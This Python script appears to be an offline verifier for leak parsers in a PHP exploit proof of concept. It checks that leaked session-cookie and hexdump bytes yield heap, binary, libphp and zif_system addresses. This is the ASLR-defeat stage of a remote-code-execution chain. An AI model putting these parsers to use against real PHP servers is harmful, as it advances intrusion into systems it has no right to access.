#!/usr/bin/env python3 -I
"""Parser verifier for leak_parsers.py (offline; no lab needed).

Feeds representative response/header bytes and synthetic disclosure windows and
asserts the parsed address sets: cookie_from_headers (Set-Cookie urldecode),
classify_cookie triage, parse_cookie_leak / parse_var_hash_leak (self-referential
0x40-stride chain -> chunk; static-HashTable node -> binbase; run-time-cache
cluster -> fn), and parse_cookie_rce_leak (page-offset dtor pin -> libphp base).

    python3 -I poc/primitives/read_leak/verify_leak_parsers.py
"""
from __future__ import annotations

import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.read_leak import leak_parsers as L  # noqa: E402

CHUNK = 0x7f1200000000      # 2 MiB-aligned ZendMM chunk
BINBASE = 0x7f2000000000    # page-aligned php binary base
FN_BASE = 0x7f1800000000    # run-time-cache cluster / fn
ZDTOR_OFF = 0x65eb60

OFF = {
    "zval_ptr_dtor": ZDTOR_OFF,
    "a_off": 0x69000, "copy_off": 0x11000, "sid_off": 0x22000,
    "zif_system": 0x4a1230,
    "anchor_slots": {i: "m%d" % i for i in range(6)},
    "anchor_deltas": {"m%d" % i: 0 for i in range(6)},
}


def build_leak(size=L.LEAK_LEN):
    """A chain (0x40-stride self-ref) + a static-HashTable node + a cluster."""
    buf = bytearray(size)
    P = CHUNK + 0x1000
    for i in range(8):                                   # 8 chain nodes @0x100 stride 0x40
        struct.pack_into("<Q", buf, 0x100 + i * 0x40, P + i * 0x40)
    ht = 0x100 + 2 * 0x40                                 # node 2 = static-HashTable copy
    struct.pack_into("<Q", buf, ht + 0x20, 0x10)
    struct.pack_into("<Q", buf, ht + 0x28, 0x8000000000000000)
    struct.pack_into("<Q", buf, ht + 0x30, BINBASE + ZDTOR_OFF)
    for j in range(6):                                    # run-time-cache cluster (past the chain)
        struct.pack_into("<Q", buf, 0x400 + j * 8, FN_BASE)
    return bytes(buf)


def pe(b):
    return "".join("%%%02X" % x for x in b).encode()


def check(name, cond):
    print(("  ok   " if cond else "  FAIL ") + name)
    return cond


def main():
    ok = True

    print("## cookie_from_headers: extract + urldecode PHPSESSID")
    hdr = (b"HTTP/1.1 200 OK\r\n"
           b"Set-Cookie: PHPSESSID=SSSS%00abc+def; path=/\r\n\r\n")
    ok &= check("decodes %00 and '+'->' '", L.cookie_from_headers(hdr) == b"SSSS\x00abc def")
    ok &= check("no Set-Cookie -> None", L.cookie_from_headers(b"HTTP/1.1 200 OK\r\n\r\n") is None)
    ok &= check("non-PHPSESSID cookie -> None",
                L.cookie_from_headers(b"Set-Cookie: other=1\r\n") is None)

    print("## classify_cookie triage")
    clean = bytes("abcdefghij0123456789" * 13, "ascii")[:256]
    ok &= check("None -> ('none', None)", L.classify_cookie(None) == ("none", None))
    ok &= check("SSSS prefix -> hit", L.classify_cookie(b"SSSS\x00zzzz")[0] == "hit")
    ok &= check("256 lowercase alnum -> clean", L.classify_cookie(clean) == ("clean", clean))
    ok &= check("junk -> other", L.classify_cookie(b"weird!!")[0] == "other")

    print("## parse_cookie_leak: chain -> chunk, HT node -> binbase")
    res = L.parse_cookie_leak(build_leak(0x800), OFF)
    ok &= check("chunk", res["chunk"] == CHUNK)
    ok &= check("binbase", res["binbase"] == BINBASE)
    try:
        L.parse_cookie_leak(b"\x00" * 0x20, OFF)
        short = False
    except ValueError:
        short = True
    ok &= check("short window raises ValueError", short)

    print("## parse_cookie_leak: forward-only fallback (no chain) -> chunk, binbase=None")
    fwd = bytearray(0x400)
    for o in range(0, 0x100, 8):
        struct.pack_into("<Q", fwd, o, CHUNK + 0x5000)   # heap ptrs, no 0x40 self-ref
    fres = L.parse_cookie_leak(bytes(fwd), OFF)
    ok &= check("fallback chunk", fres["chunk"] == CHUNK)
    ok &= check("fallback binbase None", fres["binbase"] is None)

    print("## parse_var_hash_leak: full address set from sidtail hexdump")
    text = "junk\nsidtail=" + build_leak().hex() + "\nmore"
    d = L.parse_var_hash_leak(text, OFF)
    ok &= check("chunk", d["chunk"] == CHUNK)
    ok &= check("binbase", d["binbase"] == BINBASE)
    ok &= check("fn (cluster consensus)", d["fn"] == FN_BASE)
    ok &= check("a = chunk + a_off", d["a"] == CHUNK + OFF["a_off"])
    ok &= check("copy = a + copy_off", d["copy"] == CHUNK + OFF["a_off"] + OFF["copy_off"])
    ok &= check("sid = a + sid_off", d["sid"] == CHUNK + OFF["a_off"] + OFF["sid_off"])
    ok &= check("zsys = binbase + zif_system", d["zsys"] == BINBASE + OFF["zif_system"])
    try:
        L.parse_var_hash_leak("no marker here", OFF)
        nomark = False
    except ValueError:
        nomark = True
    ok &= check("missing sidtail= raises ValueError", nomark)

    print("## parse_cookie_rce_leak: page-offset dtor pin -> libphp base")
    lib = 0x7f3000000000
    zdtor = lib + ZDTOR_OFF
    dec = b"".join(struct.pack("<Q", zdtor) for _ in range(10))
    dec += b"".join(struct.pack("<Q", 0x7f1234500000) for _ in range(3))
    resp = b"HTTP/1.1 200\r\nSet-Cookie: PHPSESSID=" + pe(dec) + b"\r\n\r\n"
    rc = L.parse_cookie_rce_leak(resp, {"zval_ptr_dtor": ZDTOR_OFF})
    ok &= check("zdtor = repeated page-aligned dtor ptr", rc["zdtor"] == zdtor)
    ok &= check("lib = zdtor - zval_ptr_dtor", rc["lib"] == lib)
    ok &= check("dtor_aligned True", rc["dtor_aligned"] is True)
    ok &= check("self_locate None (determ off)", rc["self_locate"] is None)
    ok &= check("main_candidates = [other 2 MiB bucket]",
                rc["main_candidates"] == [0x7f1234500000 & ~0x1FFFFF])

    print("\n==== verify_leak_parsers: %s ====" % ("PASS" if ok else "FAIL"))
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
